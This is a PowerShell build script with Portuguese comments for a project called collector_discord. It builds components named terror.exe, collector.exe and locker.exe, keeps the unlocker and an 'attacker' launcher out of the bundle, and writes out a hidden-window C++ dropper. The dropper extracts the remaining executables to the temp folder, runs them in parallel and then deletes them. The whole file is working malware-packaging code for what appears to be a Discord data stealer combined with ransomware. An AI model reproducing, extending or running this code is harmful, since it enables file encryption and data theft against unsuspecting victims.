# build.ps1 - Builder Mestre que executa todos os builds e cria um launcher paralelo mestre
param(
    [string]$OutputName = "launcher"
)

$ErrorActionPreference = "Stop"
$scriptPath = (Get-Item $MyInvocation.MyCommand.Path).FullName
$workDir = Split-Path -Parent $scriptPath
$rootDir = (Get-Item $workDir).Parent.FullName

$isUnix = $PSVersionTable.Platform -eq "Unix" -or $IsLinux -or $IsMacOS
$outExe = "$workDir/$OutputName.exe"
$cppFile = "$workDir/launcher_gen.cpp"

Write-Host ""
Write-Host "=========================================================" -ForegroundColor Cyan
Write-Host "           BUILDER MESTRE DE COMPILACAO                  " -ForegroundColor Cyan
Write-Host "=========================================================" -ForegroundColor Cyan
Write-Host ""

# 1. Limpa executáveis antigos da pasta builder/
Write-Host "[Mestre] Limpando pasta builder/..." -ForegroundColor Yellow
Get-ChildItem -Path $workDir -Filter "*.exe" | ForEach-Object {
    Remove-Item $_.FullName -Force
}
if (Test-Path $cppFile) { Remove-Item $cppFile -Force }

# 2. Busca todos os build.ps1 do projeto (exceto o próprio mestre e o compiller intermediário)
Write-Host "[Mestre] Buscando scripts de build..." -ForegroundColor Yellow
$scripts = Get-ChildItem -Path $rootDir -Filter "build.ps1" -Recurse | Where-Object { 
    $_.FullName -ne $scriptPath -and 
    (Split-Path -Parent $_.FullName) -ne $workDir -and
    $_.FullName -notmatch "compiller"
}

# Ordena por ordem alfabética para garantir a ordem correta das dependências:
# 1. collector_discord\build.ps1 (terror.exe)
# 2. collector_discord\collector\build.ps1 (collector.exe)
# 3. collector_discord\crip\build.ps1 (locker.exe + unlocker.exe)
$orderedScripts = $scripts | Sort-Object FullName

Write-Host "[Mestre] Scripts encontrados em ordem de execucao:" -ForegroundColor Gray
foreach ($s in $orderedScripts) {
    Write-Host "  - $($s.FullName.Replace($rootDir, ''))" -ForegroundColor Gray
}
Write-Host ""

# 3. Executa cada build.ps1
foreach ($script in $orderedScripts) {
    $scriptDir = Split-Path -Parent $script.FullName
    Write-Host "---------------------------------------------------------" -ForegroundColor Gray
    Write-Host "[Mestre] Executando: $($script.Name) em $scriptDir" -ForegroundColor Cyan
    Write-Host "---------------------------------------------------------" -ForegroundColor Gray
    
    Push-Location $scriptDir
    try {
        # Executa o script passando o CopyToDir como a pasta builder/
        & $script.FullName -CopyToDir $workDir
    } catch {
        Write-Host "[ERRO] Falha ao executar $($script.FullName): $_" -ForegroundColor Red
        Pop-Location
        exit 1
    }
    Pop-Location
}

Write-Host ""
Write-Host "---------------------------------------------------------" -ForegroundColor Gray
Write-Host "[Mestre] Criando Launcher Paralelo Mestre..." -ForegroundColor Cyan
Write-Host "---------------------------------------------------------" -ForegroundColor Gray
Write-Host ""

# 4. Identifica executáveis coletados em builder/
$collectedExes = Get-ChildItem -Path $workDir -Filter "*.exe"

# Filtra para excluir o unlocker, o discord_launcher e o próprio executável final
$payloadExes = $collectedExes | Where-Object {
    $_.Name -notmatch "unlock" -and $_.Name -notmatch "discord_launcher" -and $_.Name -ne "$OutputName.exe"
}

if ($payloadExes.Count -eq 0) {
    Write-Host "[ERRO] Nenhum executavel coletado para embutir no launcher paralelo!" -ForegroundColor Red
    exit 1
}

Write-Host "[Mestre] Executaveis que serao embutidos em paralelo:" -ForegroundColor Green
foreach ($pe in $payloadExes) {
    Write-Host "  - $($pe.Name) ($([math]::Round($pe.Length/1MB,2)) MB)" -ForegroundColor Gray
}

$unlockerFile = $collectedExes | Where-Object { $_.Name -match "unlock" }
if ($unlockerFile) {
    Write-Host "[Mestre] Executavel de desbloqueio detectado e EXCLUIDO do launcher paralelo (ficara avulso na pasta):" -ForegroundColor Yellow
    Write-Host "  - $($unlockerFile.Name)" -ForegroundColor Gray
}

$discordLauncherFile = $collectedExes | Where-Object { $_.Name -match "discord_launcher" }
if ($discordLauncherFile) {
    Write-Host "[Mestre] Executavel do atacante detectado e EXCLUIDO do launcher paralelo:" -ForegroundColor Yellow
    Write-Host "  - $($discordLauncherFile.Name)" -ForegroundColor Gray
}
Write-Host ""

# 5. Converte cada executável em um array C++
function ConvertTo-CArray {
    param([byte[]]$data, [string]$varName)

    $sb = [System.Text.StringBuilder]::new()
    $null = $sb.AppendLine("static const unsigned char ${varName}_data[] = {")

    $lineSize = 16
    for ($i = 0; $i -lt $data.Length; $i += $lineSize) {
        $end   = [Math]::Min($i + $lineSize, $data.Length)
        $chunk = ($data[$i..($end-1)] | ForEach-Object { "0x{0:X2}" -f $_ }) -join ","
        if ($end -lt $data.Length) { $chunk += "," }
        $null = $sb.AppendLine("    $chunk")
    }

    $null = $sb.AppendLine("};")
    $null = $sb.AppendLine("static const size_t ${varName}_size = $($data.Length);")
    return $sb.ToString()
}

Write-Host "[Mestre] Gerando codigo C++ para o launcher..." -ForegroundColor Yellow

$cppCodeArrays = [System.Collections.Generic.List[string]]::new()
$cppPayloadStructs = [System.Collections.Generic.List[string]]::new()

$idx = 0
foreach ($pe in $payloadExes) {
    $bytes = [System.IO.File]::ReadAllBytes($pe.FullName)
    $varName = "payload_$idx"
    $arrayStr = ConvertTo-CArray $bytes $varName
    $cppCodeArrays.Add($arrayStr)
    $cppPayloadStructs.Add("    { ${varName}_data, ${varName}_size, `"$($pe.Name)`" }")
    $idx++
}

# 6. Monta o launcher_all_gen.cpp
$L = [System.Collections.Generic.List[string]]::new()
$L.Add('/*')
$L.Add(' * launcher_all_gen.cpp - Auto-gerado pelo Builder Mestre')
$L.Add(' * Executa todos os payloads em paralelo.')
$L.Add(' */')
$L.Add('#ifndef WIN32_LEAN_AND_MEAN')
$L.Add('#define WIN32_LEAN_AND_MEAN')
$L.Add('#endif')
$L.Add('#include <windows.h>')
$L.Add('#include <string>')
$L.Add('#include <fstream>')
$L.Add('#include <cstddef>')
$L.Add('#include <vector>')
$L.Add('')

# Insere os bytes dos payloads
foreach ($arr in $cppCodeArrays) {
    $L.Add($arr)
}

# Insere a estrutura dos payloads
$L.Add('struct Payload {')
$L.Add('    const unsigned char* data;')
$L.Add('    size_t size;')
$L.Add('    const char* filename;')
$L.Add('};')
$L.Add('')
$L.Add('static const Payload payloads[] = {')
$L.Add(($cppPayloadStructs -join ",`r`n"))
$L.Add('};')
$L.Add('static const size_t PAYLOAD_COUNT = sizeof(payloads) / sizeof(payloads[0]);')
$L.Add('')

# Funcao de drop
$L.Add('static std::string drop_file(const unsigned char* data, size_t size, const char* filename)')
$L.Add('{')
$L.Add('    char tmp[MAX_PATH];')
$L.Add('    if (GetTempPathA(MAX_PATH, tmp) == 0) return std::string();')
$L.Add('    std::string path = std::string(tmp) + filename;')
$L.Add('    std::ofstream out(path, std::ios::binary);')
$L.Add('    if (!out.is_open()) return std::string();')
$L.Add('    out.write(reinterpret_cast<const char*>(data), (std::streamsize)size);')
$L.Add('    return path;')
$L.Add('}')
$L.Add('')

# WinMain
$L.Add('int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)')
$L.Add('{')
$L.Add('    std::vector<std::string> paths;')
$L.Add('    std::vector<PROCESS_INFORMATION> pi_list;')
$L.Add('    std::vector<HANDLE> handles;')
$L.Add('')
$L.Add('    // 1. Extrai todos os EXEs para a pasta temp')
$L.Add('    for (size_t i = 0; i < PAYLOAD_COUNT; ++i) {')
$L.Add('        std::string p = drop_file(payloads[i].data, payloads[i].size, payloads[i].filename);')
$L.Add('        paths.push_back(p);')
$L.Add('    }')
$L.Add('')
$L.Add('    // 2. Executa todos os processos em paralelo')
$L.Add('    for (size_t i = 0; i < PAYLOAD_COUNT; ++i) {')
$L.Add('        if (paths[i].empty()) continue;')
$L.Add('        STARTUPINFOA si = {};')
$L.Add('        si.cb = sizeof(si);')
$L.Add('        PROCESS_INFORMATION pi = {};')
$L.Add('        BOOL ok = CreateProcessA(paths[i].c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);')
$L.Add('        if (ok) {')
$L.Add('            pi_list.push_back(pi);')
$L.Add('            handles.push_back(pi.hProcess);')
$L.Add('        }')
$L.Add('    }')
$L.Add('')
$L.Add('    // 3. Aguarda todos os processos terminarem')
$L.Add('    if (!handles.empty()) {')
$L.Add('        WaitForMultipleObjects((DWORD)handles.size(), handles.data(), TRUE, INFINITE);')
$L.Add('    }')
$L.Add('')
$L.Add('    // 4. Fecha os handles')
$L.Add('    for (const auto& pi : pi_list) {')
$L.Add('        CloseHandle(pi.hProcess);')
$L.Add('        CloseHandle(pi.hThread);')
$L.Add('    }')
$L.Add('')
$L.Add('    // 5. Apaga os arquivos temporarios')
$L.Add('    for (size_t i = 0; i < PAYLOAD_COUNT; ++i) {')
$L.Add('        if (!paths[i].empty()) {')
$L.Add('            DeleteFileA(paths[i].c_str());')
$L.Add('        }')
$L.Add('    }')
$L.Add('    return 0;')
$L.Add('}')

[System.IO.File]::WriteAllLines($cppFile, $L, [System.Text.UTF8Encoding]::new($false))

# 7. Compila o launcher paralelo mestre
Write-Host "[Mestre] Compilando launcher mestre..." -ForegroundColor Yellow
$compiled = $false

if ($isUnix) {
    # Cross-compilação no Docker
    $gpp = "x86_64-w64-mingw32-g++-posix"
    Write-Host "      [Unix] Usando: $gpp (Cross-Compiler)" -ForegroundColor Gray
    try {
        & $gpp -O2 -std=c++17 -o $outExe $cppFile -lkernel32 -mwindows -static -static-libgcc -static-libstdc++
        if ($LASTEXITCODE -eq 0) { $compiled = $true }
    } catch {
        Write-Host "[ERRO] Cross-compilador falhou" -ForegroundColor Red
    }
} else {
    # Tenta g++ (MinGW)
    $gpp = Get-Command "g++" -ErrorAction SilentlyContinue
    if ($gpp) {
        Write-Host "      Usando: g++ (MinGW)" -ForegroundColor Gray
        $result = & g++ -O2 -std=c++17 -o $outExe $cppFile -lkernel32 -mwindows -static -static-libgcc -static-libstdc++ 2>&1
        if ($LASTEXITCODE -eq 0) {
            $compiled = $true
        } else {
            Write-Host "[AVISO] g++ falhou:" -ForegroundColor DarkYellow
            Write-Host $result -ForegroundColor DarkYellow
        }
    }

    # Tenta cl.exe (MSVC)
    if (-not $compiled) {
        $cl = Get-Command "cl.exe" -ErrorAction SilentlyContinue
        if ($cl) {
            Write-Host "      Usando: cl.exe (MSVC)" -ForegroundColor Gray
            $result = & cl.exe /O2 /EHsc /std:c++17 $cppFile "/Fe:$outExe" /link kernel32.lib /SUBSYSTEM:WINDOWS 2>&1
            if ($LASTEXITCODE -eq 0) { $compiled = $true }
        }
    }
}

# 8. Limpeza dos arquivos temporários de compilação
Remove-Item $cppFile -Force -ErrorAction SilentlyContinue
if (-not $isUnix) {
    $objFile = $outExe.Replace(".exe", ".obj")
    if (Test-Path $objFile) { Remove-Item $objFile -Force }
}

if ($compiled -and (Test-Path $outExe)) {
    $sizeMB = [math]::Round((Get-Item $outExe).Length / 1MB, 2)
    Write-Host ""
    Write-Host "+--------------------------------------------------+" -ForegroundColor Green
    Write-Host "| COMPILACAO CONCLUIDA COM SUCESSO!                |" -ForegroundColor Green
    Write-Host "| Executavel: $OutputName.exe ($sizeMB MB)         |" -ForegroundColor Green
    Write-Host "| Pasta:      builder/                             |" -ForegroundColor Green
    Write-Host "+--------------------------------------------------+" -ForegroundColor Green
    Write-Host ""
} else {
    Write-Host "[ERRO] Falha ao compilar $OutputName.exe" -ForegroundColor Red
    exit 1
}
